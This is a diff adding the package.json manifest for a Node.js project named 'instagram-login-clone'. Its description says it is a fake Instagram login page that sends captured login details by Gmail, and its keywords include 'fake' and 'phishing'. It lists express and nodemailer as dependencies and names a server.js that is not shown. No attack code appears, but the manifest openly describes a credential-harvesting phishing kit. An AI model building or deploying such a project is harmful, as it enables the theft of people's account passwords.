@@ -1,0 +1,22 @@
+{
+  "name": "instagram-login-clone",
+  "version": "1.0.0",
+  "description": "Fake Instagram Login Page to receive login info via Gmail",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "keywords": [
+    "instagram",
+    "login",
+    "fake",
+    "nodejs",
+    "phishing"
+  ],
+  "author": "Your Name",
+  "license": "MIT",
+  "dependencies": {
+    "express": "^4.21.2",
+    "nodemailer": "^6.10.1"
+  }
+}
